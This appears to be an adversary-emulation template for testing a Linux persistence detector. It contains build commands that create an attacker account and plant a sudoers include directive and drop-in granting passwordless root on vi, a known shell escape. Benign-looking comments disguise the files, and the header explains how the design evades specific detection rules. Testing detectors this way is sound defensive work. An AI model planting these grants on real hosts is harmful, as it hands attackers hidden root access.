# Implant template: apt-sudoers-include-fleetwide (L5, armed)
#
# APT TTP mirror: defender-aware privilege persistence via a sudoers
# #includedir indirection planted IDENTICALLY fleet-wide (T1548.003).
# The textbook NOPASSWD:ALL backdoor (sudoers-nopass-attacker) fires
# sudoers_nopasswd + sudoers_all_commands -> sudoers_nopasswd_all_backdoor
# (critical). This implant evades on TWO axes at once:
#   1) It does NOT grant ALL. It scopes the NOPASSWD grant to a single
#      packaged LOLBin (/usr/bin/vi, the classic sudo-to-shell escape via
#      :!sh). sudoers_all_commands does NOT fire (no ALL token), so the
#      AND-joined sudoers_nopasswd_all_backdoor rule is SILENT even though
#      the grant is fully exploitable.
#   2) The grant is delivered via a #includedir directive that pulls in a
#      drop-in carrying the real line, and the SAME pair of files is
#      planted byte-identically on every host -> not a Q1 singleton.
# sudoers_nopasswd fires alone and sudoers_include_directive fires on the
# parent, but no rule consumes either without sudoers_all_commands.
# Finding: scoping NOPASSWD to a single GTFOBin defeats the
# nopasswd+ALL rule; fleet-wide identity defeats Q1. The honest fix is a
# GTFOBins-aware command list, which linpersist does not model.
#
# Variables: ${include_file}, ${dropin_file}, ${attacker_user}

RUN useradd --create-home --shell /bin/bash ${attacker_user} 2>/dev/null || true

# Parent file carries only the #includedir indirection (looks benign).
RUN mkdir -p "$$(dirname ${include_file})" && \
    printf '%s\n' \
        '# central sudo policy (managed)' \
        '#includedir /etc/sudoers.d' \
        > ${include_file} && \
    chown root:root ${include_file} && \
    chmod 0440 ${include_file}

# The actual grant: NOPASSWD on a single GTFOBin, no ALL token.
RUN mkdir -p /etc/sudoers.d && \
    printf '%s\n' \
        '# editor maintenance grant (managed)' \
        '${attacker_user} ALL=(root) NOPASSWD: /usr/bin/vi' \
        > ${dropin_file} && \
    chown root:root ${dropin_file} && \
    chmod 0440 ${dropin_file}
